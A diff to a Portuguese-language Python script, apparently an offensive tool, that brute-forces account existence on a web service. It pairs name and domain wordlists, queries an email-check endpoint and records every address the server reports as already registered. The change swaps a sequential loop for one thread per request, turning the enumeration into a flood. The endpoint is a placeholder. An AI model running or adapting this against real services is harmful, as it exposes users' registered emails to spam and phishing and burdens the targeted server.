@@ -1,55 +1,46 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 #
-# by: Israel Comazzetto dos Reis
 # MASS Brute for EMAIL Checking
 
-import requests
-import time
+from requests import get
+from time import sleep
+from threading import Thread
 
-flood = 0
-flood_request = ''
+# threads_to_create = 100
+threads = []
 emails_leaked = []
 qnt_emails_leaked = 0
 
 print("[+] Iniciado MASS Brute Flooding... [+]")
-time.sleep(3)
+sleep(3)
 print("[+] Abrindo wordlist... [+]")
-arquivo = open("/home/israel-kali/wordlist/wordlist_email", "r")
-arquivo_domain = open("/home/israel-kali/wordlist/domains", "r")
-time.sleep(3)
+email_wlist = open('/home/israel-kali/wordlist/wordlist_email', 'r').readlines()
+domain_wlist = open('/home/israel-kali/wordlist/domains', 'r').readlines()
+sleep(3)
 
-for linha in arquivo_domain.readlines():
-    domains = linha
-    for linha in arquivo.readlines():
-        wordlist = linha
-        print("[+] Armezando próximo payload... [+]")
-        payloads = (f"{wordlist}@{domains}")
-        payload = payloads.replace('\n','')
-        print("[*] Enviando payload... [*]") 
-        urls =  (f"https://url/v1/users/email?email={payload}")
-        url = urls.replace('\n','')
-        flood_request = requests.get(url)
-        print(f"[+] Ultimo payload enviado: {payload} [+]")
-        print(f"[+] Ultima resposta do servidor: {flood_request.text} [+]")
-        response = flood_request.text
-        if "E-mail já cadastrado" in response:
-            emails_leaked.append(payload)
-            qnt_emails_leaked = qnt_emails_leaked + 1
-            msg_qnt_emails = (f"[*] Quantidade de e-mails descobertos: {qnt_emails_leaked} [*]")
-            msg_qnt_emails_rv_new_line  = msg_qnt_emails.replace('\n','')
-            time.sleep(5)
-            print("[*] E-MAIL LEAKED [*]")
-            print(msg_qnt_emails_rv_new_line)
-            print("[+] Printando lista com os emails descobertos.... [+]")
-            print(emails_leaked)
-            time.sleep(5)
-time.sleep(3)
+def mass_brute(email, domain):
+    emails_leaked = []
+    qnt_emails_leaked = 0
+    payloads = (f'{email}{domain}')
+    payload = payloads.replace('\n','')
+    urls = (f'http://url/v1/users/email?email={payload}')
+    url = urls.replace('\n','')
+    req = get(url)
+    if 'E-mail já cadastrado' in req.text:
+        emails_leaked.append(payload)
+        print("[*] E-MAIL LEAKED [*]")
+        print("[+] Printando lista com os emails descobertos.... [+]")
+        print(emails_leaked)
+    sleep(3)
+
+for domain in domain_wlist:
+    for email in email_wlist:
+        #make_request(email, domain)
+        th = Thread(target=mass_brute, args=(email, domain))
+        th.start()
+        threads.append(th)
+
+for th in threads:
+    th.join()
+
 print("[+] SCAN Finalizado com sucesso... [+]")
-msg_qnt_emails = (f"[*] Quantidade de e-mails descobertos: {qnt_emails_leaked} [*]")
-msg_qnt_emails_rv_new_line  = msg_qnt_emails.replace('\n','')
-print(msg_qnt_emails_rv_new_line)
-print("[+] Printando lista com os emails descobertos.... [+]")
-print(emails_leaked)
-
-arquivo.close()
-arquivo_domain.close()
